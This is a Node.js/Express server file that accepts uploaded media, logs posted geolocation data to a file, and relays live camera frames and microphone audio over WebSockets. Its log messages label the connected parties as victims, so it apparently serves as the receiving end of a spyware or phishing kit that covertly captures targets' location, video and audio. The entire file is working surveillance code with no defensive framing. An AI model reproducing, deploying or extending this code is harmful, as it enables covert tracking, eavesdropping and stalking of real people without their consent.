const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const morgan = require("morgan");
const WebSocket = require("ws");
const app = express();
const httpPort = Number(process.argv[2]);
const wsVideoPort = Number(process.argv[3]);
const wsAudioPort = Number(process.argv[4]);
if ([httpPort, wsVideoPort, wsAudioPort].some(p => isNaN(p))) {
  throw new Error("All ports must be numbers");
}
const PORT = httpPort;
const UPLOAD_IMAGES = path.join(__dirname, "uploads");
const UPLOAD_AUDIOS = path.join(__dirname, "audios");
const UPLOAD_VIDEOS = path.join(__dirname, "videos");
const LOG_FILE = path.join(__dirname, "locations.log");
[UPLOAD_IMAGES, UPLOAD_AUDIOS, UPLOAD_VIDEOS].forEach(folder => {
  if (!fs.existsSync(folder)) {
    fs.mkdirSync(folder);
  }
});
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, "");
}
app.use(morgan("dev"));
app.use(express.json());
app.use(express.text());
app.use(express.static(path.join(__dirname, "templates")));
app.use("/uploads", express.static(UPLOAD_IMAGES));
app.use("/audios", express.static(UPLOAD_AUDIOS));
app.use("/videos", express.static(UPLOAD_VIDEOS));
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    let uploadPath = UPLOAD_IMAGES;
    if (file.mimetype.startsWith("image/")) {
      uploadPath = UPLOAD_IMAGES;
    } else if (file.mimetype.startsWith("audio/")) {
      uploadPath = UPLOAD_AUDIOS;
    } else if (file.mimetype.startsWith("video/")) {
      uploadPath = UPLOAD_VIDEOS;
    }
    cb(null, uploadPath);
  },
  filename: function (req, file, cb) {
    const timestamp = new Date().toISOString().replace(/[-:.TZ]/g, "_");
    const safeName = file.originalname.replace(/\s+/g, "_");
    cb(null, `${timestamp}_${safeName}`);
  }
});
const upload = multer({
  storage: storage,
  limits: { fileSize: 50 * 1024 * 1024 }
});
app.post("/upload", upload.array("files"), (req, res) => {
  if (!req.files || req.files.length === 0) {
    return res.status(400).json({
      success: false,
      message: "No files uploaded"
    });
  }
  res.status(200).json({
    success: true,
    files: req.files.map(file => ({
      filename: file.filename,
      type: file.mimetype,
      path:
        file.mimetype.startsWith("image/")
          ? `/uploads/${file.filename}`
          : file.mimetype.startsWith("audio/")
          ? `/audios/${file.filename}`
          : `/videos/${file.filename}`
    }))
  });
});
app.post("/get-location", (req, res) => {
  try {
    const location = req.body;
    if (!location || location.lat == null || location.lng == null) {
      return res.status(400).json({
        success: false,
        message: "Invalid location data"
      });
    }
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}]
Source: ${location.source || "unknown"}
Latitude: ${location.lat}
Longitude: ${location.lng}
City: ${location.city || "N/A"}
Country: ${location.country || "N/A"}
-----------------------------------
`;
    fs.appendFileSync(LOG_FILE, logEntry);
    res.status(200).json({
      success: true,
      message: "Location saved successfully"
    });
  } catch (err) {
    console.error("Error saving location:", err);
    res.status(500).json({
      success: false,
      message: "Server error"
    });
  }
});
const wss = new WebSocket.Server({
  host: "0.0.0.0",
  port: wsVideoPort
});
let latestFrame = null;
wss.on("connection", ws => {
  console.log("Python connected (WebSocket)");
  ws.on("message", data => {
    latestFrame = data;
  });
});
app.get("/video_feed", (req, res) => {
  res.writeHead(200, {
    "Content-Type": "multipart/x-mixed-replace; boundary=frame",
    "Cache-Control": "no-cache",
    "Connection": "close"
  });
  const interval = setInterval(() => {
    if (!latestFrame) return;
    res.write(`--frame\r\n`);
    res.write(`Content-Type: image/jpeg\r\n`);
    res.write(`Content-Length: ${latestFrame.length}\r\n\r\n`);
    res.write(latestFrame);
    res.write("\r\n");
  }, 33);
  req.on("close", () => clearInterval(interval));
});
const wssAudio = new WebSocket.Server({
  host: "0.0.0.0",
  port: wsAudioPort
});
let audioClient = null;
let browserAudio = null;
wssAudio.on("connection", ws => {
  console.log("Audio WebSocket connected");
  ws.on("message", data => {
    if (ws === audioClient && browserAudio && browserAudio.readyState === WebSocket.OPEN) {
      browserAudio.send(data);
    }
  });
  if (!audioClient) {
    audioClient = ws;
    console.log("🎤 Victim connected for audio");
  } else if (!browserAudio) {
    browserAudio = ws;
    console.log("🌐 Browser victim connected to audio");
  } else {
    ws.close();
  }
  ws.on("close", () => {
    if (ws === audioClient) audioClient = null;
    if (ws === browserAudio) browserAudio = null;
  });
});
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running at: http://0.0.0.0:${PORT}`);
});